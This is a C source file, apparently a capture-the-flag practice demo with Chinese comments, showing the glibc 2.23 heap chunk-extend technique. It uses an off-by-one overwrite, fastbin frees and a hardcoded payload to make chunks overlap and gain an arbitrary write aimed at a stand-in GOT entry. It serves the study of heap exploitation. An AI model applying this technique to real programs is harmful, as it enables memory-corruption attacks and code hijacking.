//
// Created by badmonkey on 2021/4/10.
//
#include "stdio.h"
#include "stdlib.h"
#include "string.h"
typedef struct Data{
    ssize_t  size;
    char* content;
}data;
char target_address[40];
int main(){
    strcpy(target_address,"free got address or other got address");
    // malloc data0
    data* data0 = (data *) malloc(sizeof(data));
    data0->size = 0x18;
    data0->content = (char *) malloc(data0->size);
    memset(data0->content,'0',data0->size);
    // malloc data1
    data* data1 = (data *)malloc(sizeof(data));
    data1->size = 0x8;
    data1->content = (char *) malloc(data1->size);
    memset(data1->content,'1',data1->size);
    // use off by one or other method to overwrite data1's chunk size
    memset(data0->content,0x41,data0->size+1);
    // free data1使得data1的chunk 和 data1的 content chunk 交叉
    free(data1->content); // fastbin 0x20
    free(data1); // fastbin 0x40
    // malloc 一个 data2
    data*  data2 = (data* )malloc(sizeof(data)); // 分配到了 fastbin 0x20中的chunk即原data1的content chunk
    data2->size = 0x30; //分配 fastbin 0x40 chunk 原data1 extend 后的chunk
    data2->content = (char *)malloc(data2->size);
    strcpy(data2->content,"data2 's content");
    // 此时 data2的content chunk 和data2 chunk 产生了重合
    //如果我们可以修改data2的content,那么我们可以任意写data2的chunk
    printf("data2's size = %ld\ncontent = %s\n",data2->size,data2->content);

    char* payload = "33333333333333333333333333333333@\x00\x00\x00\x00\x00\x00\x00\x80@@\x00\x00\x00\x00\x00";
    //写data2的content 进而覆盖data2的size 和 content地址，首先将content地址改写为free got 地址或者其他got地址
    memcpy(data2->content,payload,0x30);

    printf("data2's size = %ld\ncontent = %s\n",data2->size,data2->content);

    printf("original target content = %s\n",target_address);
    // 任意地址写，改写free got表内容
    strcpy(data2->content,"change got address to system address");
    printf("current target content = %s\n",target_address);
//    free(data2->content);
//    free(data2);
    free(data0->content);
    free(data0);
    return 0;
}

//gcc chunk_extend.c -Wl,--rpath=/home/badmonkey/code/ctf/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ -Wl,--dynamic-linker=/home/badmonkey/code/ctf/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so -o chunk_extend  -no-pie -g
